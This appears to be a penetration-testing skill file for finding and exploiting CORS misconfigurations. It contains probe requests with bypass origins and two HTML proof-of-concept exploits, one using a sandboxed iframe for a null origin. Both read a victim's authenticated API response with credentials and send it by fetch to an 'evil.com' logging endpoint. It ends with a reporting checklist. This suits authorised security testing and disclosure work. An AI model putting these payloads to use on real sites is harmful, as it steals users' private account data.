---
name: web-cors-misconfiguration-bypass
description: Cross-Origin Resource Sharing (CORS) misconfiguration auditing, arbitrary origin reflection with credentials, null origin iframe bypass, and trust abuse.
playbook: web-security
---

# Web CORS Misconfiguration & Origin Reflection

## Attack Vector Summary
CORS misconfigurations allow untrusted websites to bypass the browser's Same-Origin Policy (SOP) and read sensitive authenticated responses (user PII, financial data, API keys, private messages) if the server dynamically reflects the `Origin` header while setting `Access-Control-Allow-Credentials: true`.

## Tactical Heuristics & Step-by-Step Flow

### 1. Origin Header Probing Decision Tree
Send probe requests with various `Origin` header patterns to check for reflection and credential allowance:

```http
# 1. Arbitrary Untrusted Origin:
GET /api/user/profile HTTP/1.1
Host: target.com
Origin: https://evil.com
Cookie: session=AUTH_COOKIE

# Check response for:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true

# 2. Null Origin (Sandboxed iframe or file:// protocol):
Origin: null
# Check response for: Access-Control-Allow-Origin: null

# 3. Subdomain / Prefix / Suffix Bypasses:
Origin: https://target.com.evil.com
Origin: https://eviltarget.com
Origin: https://target.com@evil.com
Origin: https://target.com.proxy.net
```

### 2. Proof of Concept Exploit Generation
When reflection with credentials is confirmed, verify with a client-side PoC:

```html
<!DOCTYPE html>
<html>
<body>
<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    // Send victim's sensitive profile data to attacker server
    fetch('https://evil.com/log?data=' + encodeURIComponent(this.responseText));
  };
  req.open('GET', 'https://target.com/api/user/profile', true);
  req.withCredentials = true;
  req.send();
</script>
</body>
</html>
```

### 3. Null Origin Sandbox Exploit
If the server only reflects `Origin: null`:
```html
<!-- Sandboxed iframe generates Origin: null -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
  <script>
    var req = new XMLHttpRequest();
    req.onload = function() {
      fetch('https://evil.com/log?data=' + encodeURIComponent(this.responseText));
    };
    req.open('GET', 'https://target.com/api/user/profile', true);
    req.withCredentials = true;
    req.send();
  </script>
"></iframe>
```

## Empirical Disclosed Report Patterns & High-Risk Matrices
| Vector / Pattern | Vulnerable Configuration | Exploit Mechanism | Impact |
|---|---|---|---|
| Arbitrary Origin Reflection | `ACAO: $http_origin` + `ACAC: true` | Attacker site reads full JSON response with user cookies | Critical (Full account data theft) |
| Null Origin Trust | `ACAO: null` + `ACAC: true` | Sandboxed `iframe` triggers null origin request | High (Authenticated PII exfiltration) |
| Prefix / Suffix Regex Flaw | Regex matches `target.com.*` | Attacker hosts on `target.com.attacker.com` | High (Data theft across tenants) |

## Evidence Collection & Validation Gate
- Must capture request with `Origin:` header and response showing matching `Access-Control-Allow-Origin:` and `Access-Control-Allow-Credentials: true`.
- Confirm response body contains non-public authenticated data.
- Evaluate against `/validate` 7-Question Validation Gate before reporting.
